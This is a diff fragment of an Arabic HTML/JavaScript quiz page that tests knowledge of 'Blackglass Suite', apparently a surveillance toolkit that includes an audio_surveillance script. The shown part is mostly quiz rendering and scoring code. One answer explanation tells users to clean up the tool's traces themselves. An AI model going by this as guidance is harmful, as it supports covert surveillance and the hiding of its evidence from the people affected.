+                { text: "تستخدم تقنيات انعدام الجذور", correct: false },
+                { text: "تشفير الملفات المصدر", correct: false }
+            ], correctExplanation: "الأداة تولد الملفات محلياً ولا ترفعها للخارج، ولكن يجب على المستخدم تنظيف آثاره بنفسه.", wrongExplanation: "لا توجد حذف ذاتي آلي.", consequences: "قد تبقى الملفات في القرص." }
+        ];
+        examQuestions.push(...extraHard);
+        while(examQuestions.length < 20) examQuestions.push({...extraHard[0], question: "تأكيد معرفة سكربت audio_surveillance؟", options: extraHard[0].options, correctExplanation: extraHard[0].correctExplanation, wrongExplanation: extraHard[0].wrongExplanation, consequences: extraHard[0].consequences });
+
+        function shuffleArray(arr) { for(let i=arr.length-1;i>0;i--){ const j=Math.floor(Math.random()*(i+1));[arr[i],arr[j]]=[arr[j],arr[i]];} return arr; }
+
+        function startExam() {
+            document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
+            document.querySelector('.exam-button').classList.add('hidden');
+            currentLesson=1; score=0; mistakes=[];
+            renderExam();
+        }
+
+        function renderExam() {
+            const container = document.getElementById('examContainer');
+            container.classList.remove('hidden');
+            const q = examQuestions[currentLesson-1];
+            const progress = (currentLesson/examQuestions.length)*100;
+            const shuffled = shuffleArray([...q.options]);
+            const correctIndex = shuffled.findIndex(o=>o.correct);
+            container.innerHTML = `
+                <div class="header">
+                    <h1>🎮 اختبار Blackglass Suite</h1>
+                    <div class="progress-bar"><div class="progress-fill" style="width:${progress}%"></div></div>
+                    <div class="progress-text">${currentLesson} من ${examQuestions.length}</div>
+                </div>
+                <div class="lesson-card">
+                    <h2 class="lesson-title">
+                        السؤال ${currentLesson}
+                        <span class="difficulty-badge difficulty-${q.difficulty}">${q.difficulty==='easy'?'سهل':(q.difficulty==='hard'?'صعب':'خبير')}</span>
+                    </h2>
+                    <p><strong>${q.question}</strong></p>
+                    <div class="quiz-section">
+                        <div class="quiz-options" id="optionsDiv">
+                            ${shuffled.map((opt,i)=>`<div class="quiz-option" data-correct="${i===correctIndex}" data-text="${opt.text.replace(/"/g, '&quot;')}">${opt.text}</div>`).join('')}
+                        </div>
+                        <div class="feedback" id="feedbackMsg"></div>
+                    </div>
+                    <div class="nav-buttons">
+                        <button class="btn" ${currentLesson===1?'disabled':''} onclick="previousQuestion()">← السابق</button>
+                        <button class="btn" id="nextBtn" disabled onclick="nextQuestion()">${currentLesson===examQuestions.length?'النتيجة النهائية':'التالي →'}</button>
+                    </div>
+                </div>
+            `;
+            document.querySelectorAll('.quiz-option').forEach(opt => opt.addEventListener('click', (e)=>checkAnswer(e.target)));
+        }
+
+        function checkAnswer(el) {
+            if(el.classList.contains('disabled')) return;
+            const isCorrect = el.dataset.correct === "true";
+            const feedback = document.getElementById('feedbackMsg');
+            const nextBtn = document.getElementById('nextBtn');
+            const q = examQuestions[currentLesson-1];
+            document.querySelectorAll('.quiz-option').forEach(opt=>{ opt.classList.add('disabled'); if(opt.dataset.correct==='true') opt.classList.add('correct'); else if(opt===el && !isCorrect) opt.classList.add('incorrect'); else if(opt===el && isCorrect) opt.classList.add('correct'); });
+            feedback.style.display='block';
+            feedback.classList.add(isCorrect?'correct':'incorrect');
+            if(isCorrect){
+                feedback.innerHTML = `<strong>✅ صحيح!</strong><br>${q.correctExplanation}`;
+                score++;
+            } else {
+                const correctAns = q.options.find(o=>o.correct).text;
+                feedback.innerHTML = `<strong>❌ خطأ</strong><br>${q.wrongExplanation}<div class="consequences-box">⚠️ ${q.consequences}</div>`;
+                mistakes.push({question: q.question, wrongAnswer: el.textContent.trim(), correctAnswer: correctAns});
+            }
+            nextBtn.disabled=false;
+        }
+        function nextQuestion(){ if(currentLesson===examQuestions.length) showFinalResults(); else { currentLesson++; renderExam(); } }
+        function previousQuestion(){ if(currentLesson>1){ currentLesson--; renderExam(); } }
+        function showFinalResults(){
+            const percent = (score/examQuestions.length)*100;
+            let level = percent>=80?"خبير Blackglass":(percent>=60?"متقدم":"مبتدئ");
+            document.getElementById('examContainer').innerHTML = `
+                <div class="lesson-card">
+                    <h2 class="lesson-title">🏆 النتيجة النهائية</h2>
+                    <div style="text-align:center;margin:30px"><div style="font-size:3em;color:#ffaa66">${score}/${examQuestions.length}</div><div>${level}</div></div>
+                    <div class="progress-bar"><div class="progress-fill" style="width:${percent}%"></div></div>
+                    ${mistakes.length? `<div><h3>📘 مراجعة الأخطاء:</h3>${mistakes.map(m=>`<div class="example-box"><strong>سؤال:</strong> ${m.question}<br><span style="color:#ff9999">إجابتك: ${m.wrongAnswer}</span><br><span style="color:#aaffaa">الصحيح: ${m.correctAnswer}</span></div>`).join('')}</div>`:'<div class="example-box">✨ لا أخطاء! إتقان ممتاز</div>'}
+                    <div class="nav-buttons"><button class="btn" onclick="location.reload()">🔄 إعادة الدليل</button><button class="btn btn-success" onclick="window.open('https://github.com/GnomeMan4201/Blackglass_Suite')">⭐ GitHub الرسمي</button></div>
+                </div>`;
+        }
+    </script>
+</body>
+</html>
